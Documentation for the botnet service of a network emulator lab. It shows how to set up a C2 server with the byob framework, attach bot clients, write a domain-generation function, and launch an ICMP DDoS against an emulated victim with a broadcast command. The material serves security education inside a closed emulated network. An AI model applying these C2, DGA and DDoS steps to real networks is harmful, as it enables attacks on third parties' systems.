
# Botnet

## What is Botnet?

A botnet is a number of Internet-connected devices, each of which is running one or more bots. Botnets can be used to perform Distributed Denial-of-Service (DDoS) attacks, steal data, send spam, and allow the attacker to access the device and its connection.

Our emulator allows user to create Botnet service, including C2 (Command & Control) server and BotClient components. Each of service can be installed in any node in the emulator.

## Botnet Service API

### Install Botnet service example


```
from seedsim.core import Emulator
from seedsim.layers import Base, Routing, Ebgp
from seedsim.compiler import Docker
from seedsim.services import BotnetClientService, BotnetService

sim = Emulator()

base = Base()
routing = Routing()
ebgp = Ebgp()

########Import######################
bot = BotnetService()
bot_client = BotnetClientService()

########Create AS and hosts#########
as_150 = base.createAutonomousSystem(150)
as_151 = base.createAutonomousSystem(151)
c2_server = as_150.createHost('c2_server')
bot_server = as_151.createHost('bot')
bot_server1 = as_151.createHost('bot1')

########Network Configuration#######
router_150 = as_150.createRouter('router0')
router_151 = as_150.createRouter('router0')
net_150 = as_150.createNetwork('net0')
net_151 = as_150.createNetwork('net0')
routing.addDirect(150, 'net0')
routing.addDirect(151, 'net0')
c2_server.joinNetwork('net0')
bot_server.joinNetwork('net0')
bot_server1.joinNetwork('net0')
router_150.joinNetwork('net0')
router_151.joinNetwork('net0')
router_150.joinNetwork('ix100')
router_151.joinNetwork('ix100')

####################################
c2_server_ip = "10.150.0.71"

########Install C2 Server###########
bot.installByName(150, 'c2_server')

########Install Bot client 1##########
c = bot_client.installByName(151, 'bot')
c.setServer(c2_server_ip)

########Install Bot client 2########
c1 = bot_client.installByName(151, 'bot1')
c1.setServer(c2_server_ip)

########Setup BGP peering###########
ebgp.addRsPeer(100, 150)
ebgp.addRsPeer(100, 151)

#######Add layers####################
sim.addLayer(base)
sim.addLayer(routing)
sim.addLayer(ebgp)
sim.addLayer(bot)
sim.addLayer(bot_client)

#######Render and compile###########
sim.render()
sim.compile(Docker(), './simple-botnet')

```

Firstly, in the code block of ```Import```, we need to import Botnet Service class and create a instance for C2 service and bot client service. In the code block of ```Create AS and hosts```, we create 2 Autonomous Systems and host respectively. As a botnet sample, we are going to make the host that in ASN 151 to be the client, ASN 150 to be C2 server. Right now we already know the IP address of C2 server because of the IP convention, so we just need to use ```installByName``` API to attach our botnet service on specific host. With bot client installation, we also need to invoke ```setServer``` to setup Botnet client, because we have to tell Botnet who is the controller. After that, we just need to add ```bot``` and ```bot_client``` layer on our emulator.



### seedsim.services.BotnetService

The class of Botnet C2 service. C2 server is used for maintaining communications with compromised systems within a target network. The instance of BotnetService() could invoke installByName API to install C2 service on a specific host by providing Autonomous System Number and Host Name.

After installation, user can attach to the docker instance of C2 server. Then go to ```/tmp/byob/byob/``` folder, by runing ```python3 server.py --port 445``` to launch the console of C2 service. More detail usage about C2 console, type ```help``` or see [Byob Document](https://github.com/malwaredllc/byob).

### seedsim.services. BotnetClientService

The class of Bot client service (usually refer to compromised systems). The instance of BotnetClientService() could invoke installByName API to install C2 service on a specific host by providing Autonomous System Number and Host Name.

### seedsim.services. BotnetClientService#setServer

This class has a method called ```setServer``` to setup the Bot client. An Bot client instance is required to setup some basic configuration. The following are attributes of ```setServer``` method.

| Attribute   |      Type     |  Description |
|-------------|:-------------:|-------------:|
| c2_server   |  Required, String | IP address of C2 server. In order to tell Bot client who is the c2_server, and when docker instance has launched, Bot client will continously connect to C2 server. If ```enable_dga``` flag is True, this attribute is not required for botnet service.|
| enable_dga  |    Optional, Bool   |   By default, it is False, when we set it to True, Bot client will adopt DGA feature to generate multiple domains and randomly choose one of them to connect. User need to register these domains, let them resolve to C2 server by using [Domain Registrar Service](domain_registrar_service.md), the default DGA function code in the following.|
| dga         | Optional, function |  When you enable DGA featrue, and want to use your own DGA function, you can define a function named ```dga``` with a list return. Bot client service will pass your DGA function to target docker instance, and randomly choose one of your domain list to connect.  If dga is not set and enable_dga is True, it will use default function.|

The following is an example of using self define dga function:

```
###########################################
def dga() -> list:
    #Generate 10 domains for the given time.
    domain_list = []
    domain = ""
    import math, datetime
    today = datetime.datetime.utcnow()
    hour = today.hour
    day = today.day
    minute = today.minute
    minute = int(math.ceil(minute/5))*5

    for i in range(16):
        day = ((day ^ 8 * day) >> 11) ^ ((day & 0xFFFFFFF0) << 17)
        hour = ((hour ^ 4 * hour) >> 25) ^ 16 * (hour & 0xFFFFFFF8)
        minute = ((minute ^ (minute << 13)) >> 19) ^ ((minute & 0xFFFFFFFE) << 12)
        domain += chr(((day ^ hour ^ minute) % 25) + 97)
        if i > 6:
            domain_list.append(domain+ ".com")

    return domain_list

##########################################

....#create AS and host, setup network 
c = bot_client.installByName(asn, host_name)
c.setServer(enable_dga=True, dga=dga)

```

On the above code, we firstly defined a function called ```dga```, this function would generate 10 domains based on current time. In every 5 minutes, the funtion will generate different a group of domain. Other than that, like a previous example, setup everything for emulator. The only one difference is that when we use ```setServer``` to setup bot client, we need to turn on the enable_dga (set it to True), and pass our dga function to the bot client. In the emulator, the bot client will use this dga function to get a set of domain and randomly choose one of them, if that domain cannot be connectd, bot program would generate it and randomly choose one domain again to connect. 



## Demonstration 

This demonstration shows how can we build a botnet service in a pretty complex network. All the code can be found on [09-botnet-in-as](https://github.com/seed-labs/SEEDEmulator/tree/feature-merge/examples/09-botnet-in-as) example.

### Step 1: Dump & Load a existed network emulator

In order to focus on Botnet service itself, in this demo, we are going to load a existed network emulator, it already setup network configuration, so we can build our own Botnet service on top of that. First, we run ```python3 MiniInternet.py``` in the 09-botnet-in-as folder, we can get the dump file called ```mini-internet.bin```. Next, in the ```botnet-in-mini-internet.py```, we would load this bin file to reuse the mini-internet emulator. 

### Step 2: Setup Botnet service

The following is the code snippet of ```botnet-in-mini-internet.py```, in order to show how do we setup our Botnet service on emulator.

```
base_layer = sim.getLayer('Base')  # Get base layer from mini-internet
x = base_layer.getAutonomousSystem(150) # Get Autonomous System 150
hosts = x.getHosts() # Get host list on AS150, we will choose one of them to install C2 server.

bot.installByName(150, hosts[0]) # install C2 server on that host.

for asn in [151,152,153,154,155]: # Install bot client on hosts in each of autonomous system
    asn_base = base_layer.getAutonomousSystem(asn)
    c = bot_client.installByName(asn, asn_base.getHosts()[0])
    c.setServer(enable_dga=True, dga=dga) # Enable dga feature, pass our dga function in to client.


domain_registrar.installByName(161, "s_com_dns") # Install Domain Registrar service on com TLD server host.
```

Basically, we chose the host in AS150 as C2 server, and install bot client in AS151,152,153,154,155, given that we have already known that these AS can be connected each other from mini-internet emulator. Also, because we are going to use DGA feature in our Botnet service, so we need a domain registrar service, which allows us to dynamically register our random domains.

### Step 3: Launch Botnet container cluster.

Run the following commands to our launch docker containers:

```
$ python3 botnet-in-mini-internet.py
$ cd botnet-in-mini-internet
$ docker-compose build
$ docker-compose up
```

Next, all the containers will be running in the background, and we need to get a shell on C2 server container. First, we use ```dockps | grep 150.0.71``` to find out the container ID of C2 server, and then use ```docksh <id>``` to attach that container. After that, we can go to ```/tmp/byob/byob``` folder to launch our Botnet C2 console by using command ```python3 server.py --port 445```.

### Step 4: Register C2 domain by using DGA

Right now we can see the console of C2, but there is no bot seesion join to our botnet, that's because in the bots clients container, they would continously connect to the domain which generate by DGA function, but these domain have not point to our C2 server, so we need to register these domain. Firstly, in 09-botnet-in-as folder, we run ```python3 dga.py``` to get a group of domain that same with bot client will connect to. Then in the VM browser, we can visit our domain registrar service that have installed before. We known the IP address of domain registrar servuce is ```10.161.0.71```, so we can directly visit ```http://10.161.0.71``` website, and register those domain that generated by dga.py. Point these domain to our C2 server: ```10.150.0.71```.

Because in every 5 minutes, domain group will be change, so we need to re-run dga.py and keep eye on it, in order to make sure domain group not flush, if we get a new group of domain, we have to re-register them.

After registration, back to C2 console, we will see our bot client join to our botnet (type ```sessions``` command in C2 console to check. ). That means we can control those bot and send any commands to them.

### Step 5: Launch DDoS attack on Botnet

Right now, in the C2 console, we can launch a DDoS attack as a demo. Type ```broadcast python3 /tmp/ddos.py 10.155.0.71``` command to run DDoS module which has installed in bot clients. After running this command, all the bots will receive C2's command and initiate DDoS attack to 10.155.0.71. The ```ddos.py``` is a simple ICMP DDoS module. Then we can attach to the container of victim (10.155.0.71), and type ```tcpdump icmp``` to monitor network package. We will see there are many of ICMP packet sent from all of bots, which means our attack is successful.